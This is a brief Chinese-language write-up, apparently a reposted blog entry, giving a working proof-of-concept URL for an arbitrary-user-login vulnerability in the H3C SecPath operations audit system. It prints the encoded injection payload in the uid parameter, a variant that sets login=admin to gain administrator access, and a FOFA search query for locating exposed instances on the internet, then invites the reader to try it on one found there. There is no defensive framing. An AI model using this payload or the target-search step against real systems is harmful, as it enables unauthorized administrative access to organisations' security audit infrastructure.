# H3C SecPath运维审计系统任意用户登录漏洞
先来看看某治的poc
----------

    ip/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm

一点细节
----

我们简单的修改一下(将login对应的值更改为admin)

    ip/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin

登陆fofa

    app="H3C SecPath运维审计系统"

找个长得丑的
------

![](H3C%20SecPath%E8%BF%90%E7%BB%B4%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/640wx_fmt%3Djpeg%26tp%3Dwebp%26wxfrom%3D5%26wx_lazy%3D1%26wx_co%3D1.webp)

输入poc
-----

![](H3C%20SecPath%E8%BF%90%E7%BB%B4%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/640wx_fmt%3Dpng%26tp%3Dwebp%26wxfrom%3D5%26wx_lazy%3D1%26wx_co%3D1.webp)

![](H3C%20SecPath%E8%BF%90%E7%BB%B4%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/1_640wx_fmt%3Dpng%26tp%3Dwebp%26wxfrom%3D5%26wx_lazy%3D1%26wx_co%3D1.webp)